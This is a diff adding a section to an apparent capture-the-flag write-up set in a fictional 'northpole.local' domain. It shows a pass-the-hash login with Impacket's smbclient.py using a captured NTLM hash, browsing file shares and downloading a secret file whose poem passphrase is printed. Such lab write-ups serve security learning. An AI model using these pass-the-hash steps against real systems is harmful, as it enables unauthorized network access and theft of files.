@@ -312,3 +312,47 @@ Certificate Templates
       ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
 
 ```
+#### Access SMB Shares with the NTLM Hash of wombleycube
+```bash
+alabaster@ssh-server-vm:~/impacket$ smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+D$
+FileShare
+IPC$
+NETLOGON
+SYSVOL
+# use FileShare
+# ls
+drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 .
+drw-rw-rw-          0  Mon Dec 25 01:14:22 2023 ..
+-rw-rw-rw-     701028  Mon Dec 25 01:14:25 2023 Cookies.pdf
+-rw-rw-rw-    1521650  Mon Dec 25 01:14:25 2023 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Mon Dec 25 01:14:25 2023 SignatureCookies.pdf
+drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 super_secret_research
+-rw-rw-rw-        165  Mon Dec 25 01:14:25 2023 todo.txt
+# cd super_secret_research
+# ls
+drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 .
+drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 ..
+-rw-rw-rw-        231  Mon Dec 25 01:14:25 2023 InstructionsForEnteringSatelliteGroundStation.txt
+# mget *
+[*] Downloading InstructionsForEnteringSatelliteGroundStation.txt
+
+```
+
+#### InstructionsForEnteringSatelliteGroundStation.txt 
+```
+alabaster@ssh-server-vm:~/impacket$ cat InstructionsForEnteringSatelliteGroundStation.txt 
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, 'Now I shall be out of sight;
+So through the valley and over the height.'
+And he'll silently take his way.
+```
